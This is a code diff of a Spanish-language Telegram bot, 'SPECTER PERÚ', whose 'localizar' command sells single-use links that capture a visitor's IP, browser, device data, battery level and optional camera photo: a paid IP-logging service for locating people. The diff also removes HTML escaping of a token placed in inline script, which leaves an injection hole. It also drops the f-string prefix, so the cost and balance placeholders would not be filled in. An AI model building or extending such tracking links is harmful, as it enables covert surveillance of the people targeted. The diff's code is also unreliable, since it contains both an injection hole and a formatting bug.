@@ -687,7 +687,7 @@ video,img{{width:100%;border-radius:12px;margin-top:12px;background:#0a1020}}
 </div>
 
 <script>
-const token = {html.escape(token)};
+const token = {token};
 const agree = document.getElementById("agree");
 const section = document.getElementById("cameraSection");
 const statusBox = document.getElementById("status");
@@ -954,19 +954,33 @@ def localizar_command(message):
 
         saldo = get_creditos(user_id)
         texto = (
-            "[1] <b>SPECTER PERÚ</b>\\n\\n"
-            "📡 <b>DEVICE VERIFICATION</b>\\n\\n"
-            "✅ Enlace individual generado.\\n"
-            "⏳ Expira en 10 minutos y se usa una sola vez.\\n\\n"
-            "📋 <b>Información que puede compartirse:</b>\\n"
-            "• IP pública y navegador.\\n"
-            "• Información aproximada del dispositivo.\\n"
-            "• Batería, si el navegador lo permite.\\n"
-            "• Fotografía opcional, solo con permiso de cámara y captura confirmada.\\n\\n"
-            "No se solicita GPS. El visitante verá el aviso en inglés y "
-            "deberá aceptar antes de enviar información.\\n\\n"
-            f"💠 <b>Costo:</b> {COSTO_LOCALIZAR} CRD\\n"
-            f"🔋 <b>Saldo restante:</b> {saldo} CRD"
+            """╔══════════════╗
+║  SPECTER PERÚ SYSTEM  [1]  ║
+╚══════════════╝
+
+┌─ 📡 DEVICE VERIFICATION ─┐
+│  STATUS: ONLINE
+└─────────────────────────┘
+
+  [✓] ENLACE INDIVIDUAL GENERADO
+  [◷] EXPIRA: 10 MINUTOS
+  [⊘] USO: ÚNICO
+
+┌─ 📋 DATA PROTOCOL ─┐
+│ • IP PÚBLICA + NAVEGADOR
+│ • INFO DISPOSITIVO APROX.
+│ • BATERÍA [SI EL NAV. PERMITE]
+│ • FOTO OPCIONAL [CON PERMISO]
+└───────────────────┘
+
+  [×] GPS: NO SOLICITADO
+  [i] El visitante verá aviso en inglés
+      y debe ACEPTAR para enviar datos.
+
+━━━━━━━━━━━━━━━
+  💠 COSTO: {COSTO_LOCALIZAR} CRD
+  🔋 SALDO RESTANTE: {saldo} CRD
+━━━━━━━━━━━━━━━"""
         )
 
         bot.send_message(
